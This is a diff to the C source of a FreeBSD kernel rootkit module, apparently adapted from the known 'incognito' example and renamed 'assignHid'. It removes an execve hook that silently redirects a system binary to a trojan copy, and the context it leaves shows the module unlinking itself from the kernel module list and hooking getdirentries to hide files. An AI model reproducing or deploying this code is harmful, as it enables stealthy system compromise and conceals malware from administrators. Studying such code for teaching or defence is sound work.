@@ -21,10 +21,10 @@
 #include<sys/malloc.h>
 //#include<sys/stdio.h>
 
-#define ORIGINAL "/sbin/hello"
-#define TROJAN "/sbin/trojan_hello"
-#define T_NAME "trojan_hello"
-#define VERSION "incognito-0.3.ko"
+#define ORIGINAL "/sbin/test"
+#define TROJAN "/sbin/trojan_test"
+#define T_NAME "assignHid"
+#define VERSION "assignHid.ko"
 /*
 * The following is the list of variables you need to reference in order
 * to hide this module, which aren't defined in any header files.
@@ -52,51 +52,6 @@ struct module {
 */
 static int
 execve_hook(struct thread *td, void *syscall_args) {
-
-    struct execve_args /* {
-        char *fname;
-        char **argv;
-        char **envv;
-     } */ *uap;
-     uap = (struct execve_args *)syscall_args;
-     struct execve_args kernel_ea;
-     struct execve_args *user_ea;
-     struct vmspace *vm;
-     vm_offset_t base, addr;
-     char t_fname[] = TROJAN;
- /* Redirect this process? */
-     if (strcmp(uap->fname, ORIGINAL) == 0) {
- /*
- * Determine the end boundary address of the current
- * process's user data space.
- */
-         vm = curthread->td_proc->p_vmspace;
-         base = round_page((vm_offset_t) vm->vm_daddr);
-         addr = base + ctob(vm->vm_dsize);
- /*
- * Allocate a PAGE_SIZE null region of memory for a new set
- * of execve arguments.
- */
-        vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE,
-        VM_PROT_ALL, VM_PROT_ALL, 0,0);
-        vm->vm_dsize += btoc(PAGE_SIZE);
- /*
- * Set up an execve_args structure for TROJAN. Remember, you
- * have to place this structure into user space, and because
- * you can't point to an element in kernel space once you are
- * in user space, you'll have to place any new "arrays" that
- * this structure points to in user space as well.
- */
-         copyout(&t_fname, (char *)addr, strlen(t_fname));
-         kernel_ea.fname = (char *)addr;
-         kernel_ea.argv = uap->argv;
-         kernel_ea.envv = uap->envv;
- /* Copy out the TROJAN execve_args structure. */
-         user_ea = (struct execve_args *)addr + sizeof(t_fname);
-         copyout(&kernel_ea, user_ea, sizeof(struct execve_args));
- /* Execute TROJAN. */
-         return(sys_execve(curthread, user_ea));
-     }
      return(sys_execve(td, syscall_args));
 }
 /*
@@ -191,11 +146,11 @@ load(struct module *module, int cmd, void *arg)
     mtx_unlock(&Giant);
     sx_xlock(&modules_sx);
 /*
-* Iterate through the modules list, looking for "incognito."
+* Iterate through the modules list, looking for "assignHid."
 * If found, decrement nextid and remove from list.
 */
     TAILQ_FOREACH(mod, &modules, link) {
-        if (strcmp(mod->name, "incognito") == 0) {
+        if (strcmp(mod->name, "assignHid") == 0) {
             nextid--;
             TAILQ_REMOVE(&modules, mod, link);
             break;
@@ -206,9 +161,9 @@ load(struct module *module, int cmd, void *arg)
     sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
     return(0);
 }
-static moduledata_t incognito_mod = {
-    "incognito", /* module name */
+static moduledata_t assignHid_mod = {
+    "assignHid", /* module name */
     load, /* event handler */
     NULL /* extra data */
 };
-DECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+DECLARE_MODULE(assignHid, assignHid_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
